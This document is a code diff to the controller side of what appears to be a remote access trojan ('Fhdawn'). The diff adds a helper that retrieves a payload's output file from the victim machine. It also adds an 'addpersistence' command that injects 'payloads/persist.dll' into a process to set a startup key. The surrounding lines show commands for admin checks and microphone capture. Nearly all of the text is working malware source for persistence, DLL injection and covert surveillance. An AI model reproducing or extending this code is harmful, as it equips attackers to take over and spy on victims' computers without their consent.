@@ -236,6 +236,15 @@ class ClientManage:
             self.SendData("delete:output.png")
             self.WaitForReply()
 
+        def PrintPayloadOutput():
+            self.SendData("fupload:output.png")
+            self.WaitForReply()
+
+            if(os.path.isfile("downloads/output.png")):
+                PrintTextFile("downloads/output.png")
+
+            else:
+                print("[x] Failed to get payload output.")
         # if(session):
         #     silent = True
         #     self.SendData("isadmin") # check admin first 
@@ -703,6 +712,17 @@ Open Ports
                     # else:
                     #     print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Fhdawn does not have Admin rights. Elevate first..")
                 
+                elif (main == "addpersistence"):
+                    app = input("[+] Enter Application name / path to add startup key : ")
+                    if(len(app) > 0):
+                        SendPayloadCommand(app)
+                        DLLTransfer("payloads/persist.dll", setting('inject_process'))
+                        self.WaitForReply()
+                        PrintPayloadOutput()
+                        RemovePayloadCommand()
+                        if(os.path.isfile("downloads/output.png")):
+                            os.remove("downloads/output.png")
+                    
                 elif(main == "capturemic"):
                     seconds = prompt("[?] Recording time in seconds : ")
                     SendPayloadCommand(seconds)
